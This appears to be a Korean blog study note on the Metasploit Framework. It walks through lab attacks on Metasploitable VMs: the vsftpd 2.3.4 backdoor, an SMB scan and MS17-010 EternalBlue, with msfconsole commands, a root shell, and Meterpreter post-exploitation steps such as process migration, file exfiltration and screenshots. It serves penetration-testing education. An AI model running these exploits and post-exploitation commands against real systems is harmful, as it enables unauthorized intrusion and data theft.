---
layout: post
title: "Metasploit Framework 공부"
date: 2025-09-07 17:00:00 +0900
categories: [해킹 툴]
---

### 1. 개요

Metasploit Framework(MSF)는 취약점 연구, 익스플로잇 코드 개발 및 실행을 위한 오픈소스 플랫폼이다. 정보 수집 · 취약점 스캔 · 익스플로잇 · 페이로드 실행 등 침투 테스트의 전 과정을 체계적으로 수행할 수 있는 환경을 제공한다.

개별 도구를 따로 사용하는 대신 `msfconsole`이라는 통합된 인터페이스 안에서 다양한 모듈을 조합하여 공격을 수행할 수 있다는 것이 가장 큰 특징이다.

---

### 2. 핵심 구성 요소

*   **Exploits (익스플로잇):** 취약점을 직접 공격하는 코드이다. 운영체제 · 서비스 · 애플리케이션 등 다양한 대상의 취약점을 공격하는 수천 개의 익스플로잇 모듈이 내장되어 있다.
*   **Payloads (페이로드):** 익스플로잇이 성공한 후 대상 시스템에서 실행되는 코드이다. 가장 대표적인 페이로드가 리버스 쉘을 연결하는 `meterpreter`나 `shell`이다.
*   **Auxiliary (보조 모듈):** 직접적인 공격 외에 정보 수집 · 스캐닝 · 퍼징 등 보조적인 작업을 수행하는 모듈이다. 포트 스캐너나 특정 서비스의 버전 정보를 확인하는 용도로도 사용된다.

---

### 3. 기본 사용 흐름

`msfconsole` 내에서의 작업은 일반적으로 다음의 흐름을 따른다.

1.  **`search [키워드]`**: 공격할 서비스나 취약점과 관련된 모듈을 검색한다.
2.  **`use [모듈 이름]`**: 사용할 익스플로잇이나 보조 모듈을 선택한다.
3.  **`show options`**: 선택한 모듈에 설정해야 할 옵션들을 확인한다. `RHOSTS`, `LHOST`
4.  **`set [옵션 이름] [값]`**: `RHOSTS`(대상 IP) `LHOST`(공격자 IP) 등 필요한 옵션을 설정한다.
5.  **`run` 또는 `exploit`**: 설정된 값으로 모듈을 실행한다.

---

### 4. 사용 예시: vsftpd 백도어 공격

`vsftpd 2.3.4`는 2011년에 공개된 가짜 백도어가 포함된 버전이다.  
이 백도어는 사용자 이름에 `:)`를 포함하면, 서버가 **6200번 포트에서 root 권한의 백도어 쉘**을 실행한다.

> **주의**: 현대 리눅스 배포판(예: Ubuntu 22.04)의 `apt`나 공식 Docker 이미지에는 이 백도어가 **포함되지 않는다**.  
> 따라서 이 공격을 재현하려면 **Metasploitable 2**와 같은 의도적으로 취약한 가상머신이 필요하다.

#### ***공격 절차***

1. **Metasploitable 2 실행**  
   [공식 사이트](https://sourceforge.net/projects/metasploitable/)에서 다운로드한 후 VirtualBox 또는 VMware로 실행한다.  
   기본 IP는 `192.168.56.101` 등 내부 네트워크 주소이다.

2. **Metasploit에서 모듈 실행**  
   ```bash
   # 1. msfconsole 실행
   msfconsole

   # 2. 백도어 익스플로잇 모듈 선택
   msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

   # 3. 대상 IP 설정
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.101

   # 4. 공격 실행
   msf6 exploit(...) > exploit
   ```

3. **결과 확인**
   공격이 성공하면 다음과 같은 메시지가 출력된다:  
   ```
   [*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.101:6200)
   ```  
   이후 `whoami`를 입력하면 `root`가 반환되며, 시스템 제어권을 획득한 것을 확인할 수 있다.

---

### 5. 사용 예시 2: 보조 모듈을 이용한 정보 수집 (SMB 스캔)

Metasploit은 직접적인 공격 외에도 `Auxiliary` 모듈을 통해 다양한 정보 수집 활동을 수행할 수 있다.  
예를 들어 `smb_version` 모듈은 대상 서버의 SMB(윈도우 파일 공유) 서비스 버전을 확인하는 데 사용된다.

```bash
# 1. SMB 버전 스캔 모듈 검색 및 선택
msf6 > use auxiliary/scanner/smb/smb_version

# 2. 대상 IP 설정
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.56.101

# 3. 스캐너 실행
msf6 auxiliary(...) > run
```

실행 결과로 다음 정보가 출력된다:  
```
[+] 192.168.56.101:445    - Host is running Windows 2008 R2 SP1 (build:7601) (name:WIN-MACHINE) (domain:WORKGROUP)
```  
이 정보는 추후 해당 OS에 맞는 익스플로잇(예: MS17-010)을 선택하는 데 활용된다.

---

### 6. 사용 예시 3: Meterpreter를 이용한 시스템 제어

Metasploit의 가장 강력한 기능은 **Meterpreter** 페이로드에 있다. Meterpreter는 일반 쉘과 달리 메모리 상에서만 동작하며, 파일 시스템 정보 수집 · 프로세스 제어 · 권한 상승 등 침투 테스트에 특화된 다양한 기능을 제공한다.

이 예시는 윈도우 시스템의 SMB 취약점(MS17-010, 이터널블루)을 공격하여 Meterpreter 세션을 획득하고 시스템을 제어하는 과정을 보여준다.

#### ***공격 시나리오: MS17-010 (EternalBlue)***

Metasploitable 2는 Windows 머신이 아니지만,  
**Metasploitable 3 **(Windows 기반)을 사용하면 다음과 같은 공격이 가능하다.

1. **모듈 설정**  
   ```bash
   # 이터널블루 익스플로잇 모듈 선택
   msf6 > use exploit/windows/smb/ms17_010_eternalblue

   # 옵션 확인 및 대상 IP(RHOSTS), 공격자 IP(LHOST) 설정
   msf6 exploit(...) > set RHOSTS 192.168.56.102
   msf6 exploit(...) > set LHOST 192.168.56.1

   # 공격 실행
   msf6 exploit(...) > exploit
   ```

#### ***Meterpreter 세션 활용***
공격에 성공하면 `meterpreter >` 라는 새로운 프롬프트가 나타난다. 여기서는 일반 쉘 명령어와 다른 Meterpreter 전용 명령어를 사용할 수 있다.

*   **시스템 정보 확인:**
    ```meterpreter
    sysinfo     # 대상 시스템의 운영체제, 아키텍처 등 기본 정보 확인
    getuid      # 현재 세션이 어떤 사용자 권한으로 실행 중인지 확인 (예: NT AUTHORITY\SYSTEM)
    ```
*   **프로세스 제어:**
    ```meterpreter
    ps          # 현재 실행 중인 프로세스 목록 확인
    migrate [PID] # Meterpreter 세션을 다른 안정적인 프로세스(예: explorer.exe)로 이전하여 연결 지속성을 높임
    ```
*   **파일 시스템 및 정보 탈취:**
    ```meterpreter
    ls          # 현재 디렉터리의 파일 목록 확인
    download C:\\Users\\user\\Desktop\\secret.txt .  # 대상 PC의 파일을 공격자 PC로 다운로드
    screenshot  # 대상 PC의 현재 화면을 스크린샷으로 캡처
    ```

이처럼 Meterpreter는 단순한 원격 제어를 넘어 시스템을 분석하고 정보를 탈취하며 공격의 흔적을 숨기는 등 고도화된 침투 테스트 작업을 효율적으로 수행할 수 있는 환경을 제공한다.

<hr class="short-rule">